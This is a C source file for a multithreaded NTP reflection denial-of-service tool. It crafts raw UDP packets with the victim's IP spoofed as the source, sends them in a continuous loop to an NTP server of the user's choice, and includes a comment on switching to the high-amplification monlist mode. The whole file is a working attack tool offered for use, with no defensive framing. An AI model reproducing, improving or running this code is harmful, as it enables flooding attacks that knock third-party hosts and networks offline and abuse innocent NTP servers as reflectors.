#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <pthread.h>
#include <stdatomic.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>

char TARGET_IP[50];
char NTP_IP[50];
int NUM_THREAD;
int DURATION;

bool EXIT;
time_t START;
atomic_int SEND_PACKAGE;

unsigned short check_sum(unsigned short *a, int len) {
    unsigned int sum = 0;

    while (len > 1) {
        sum += *a++;
        len -= 2;
    }

    if (len) {
        sum += *(unsigned char *)a;
    }

    while (sum >> 16) {
        sum = (sum >> 16) + (sum & 0xffff);
    }

    return (unsigned short)(~sum);
}

void* Sender(void* args) {
    int s;

    unsigned char ntp_payload[48];
    memset(ntp_payload, 0x00, 48);

    // E3 = 11 100 011, LI = 3, VN = 4, Mode = 3
    // Use 0x17 to test monlist (VN = 2, Mode = 7)
    ntp_payload[0] = 0xE3;


    s = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
    if(s < 0) {
        printf("Failed to open socket. Check if you have privilege\n");
        exit(1);
    }
    const int on = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
    setuid(getuid());

    struct sockaddr_in* serverAddr = malloc(sizeof(struct sockaddr_in));
    serverAddr->sin_family = AF_INET;
    serverAddr->sin_port = htons(123);
    serverAddr->sin_addr.s_addr = inet_addr(NTP_IP);

    struct sockaddr_in* clientAddr = malloc(sizeof(struct sockaddr_in));
    clientAddr->sin_family = AF_INET;
    clientAddr->sin_port = htons(40000);
    clientAddr->sin_addr.s_addr = inet_addr(TARGET_IP);

    double pack_len = sizeof(struct ip) + sizeof(struct udphdr) + 48 * sizeof(char);

    char buffer[500];
    struct ip *ipp;
    struct udphdr *udp;
    memset(buffer, 0x00, 500);

    ipp = (struct ip *)buffer;
    ipp->ip_v=4;
    ipp->ip_hl=sizeof(struct ip)>>2;
    ipp->ip_tos=0;
    ipp->ip_len=pack_len;
    ipp->ip_id=0;
    ipp->ip_off=0;
    ipp->ip_ttl=255;
    ipp->ip_p=IPPROTO_UDP;
    ipp->ip_src=clientAddr->sin_addr;
    ipp->ip_dst=serverAddr->sin_addr;
    ipp->ip_sum=0;

    udp = (struct udphdr*)(buffer + sizeof(struct ip));
    udp->uh_sport = clientAddr->sin_port;
    udp->uh_dport = serverAddr->sin_port;
    udp->uh_ulen = htons(sizeof(struct udphdr) + 48 * sizeof(char)) ;
    udp->uh_sum = 0;
    udp->uh_sum=check_sum((unsigned short *)udp,sizeof(struct udphdr));

    memcpy(buffer + sizeof(struct ip) + sizeof(struct udphdr), ntp_payload , 48 * sizeof(char));

    while(true) {
        if(EXIT) {
            return NULL;
        }
        sendto(s,buffer,pack_len,0,(struct sockaddr *)serverAddr,sizeof(*serverAddr));
        SEND_PACKAGE++;
    }
}

void* Logger(void* args) {
    while(true) {
        time_t now = time(NULL);
        if( DURATION < (now - START) ) {
            EXIT = true;
            printf("Complete. \n");
            return NULL;
        }
        printf("# Packet sent: %d\n", SEND_PACKAGE);
    }
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        printf("Follow ./ntpreflec <target> <ntp> <threads> <duration>\n");
        return 0;
    }
    strcpy(TARGET_IP, argv[1]);
    strcpy(NTP_IP, argv[2]);
    NUM_THREAD = atoi(argv[3]);
    DURATION = atoi(argv[4]);

    // a minimum of 2 threads
    if (NUM_THREAD < 2) {
        NUM_THREAD = 2;
    }

    SEND_PACKAGE = 0;
    EXIT = false;

    printf("Target: %s\n", TARGET_IP);
    printf("NTP: %s\n", TARGET_IP);
    printf("Threads: %s\n", argv[2]);
    printf("Duration: %ds\n", DURATION);

    START = time(NULL);

    pthread_t logThread;
    pthread_create(&logThread, NULL, Logger, NULL);

    pthread_t senderThreads[NUM_THREAD];
    for (int i = 0; i < NUM_THREAD; i++) {
        int p = pthread_create(&senderThreads[i], NULL, Sender, NULL);
        if (p == 0) {
            printf("Sender thread %d spawned\n", i + 1);
            sleep(1);
        }
    }
}
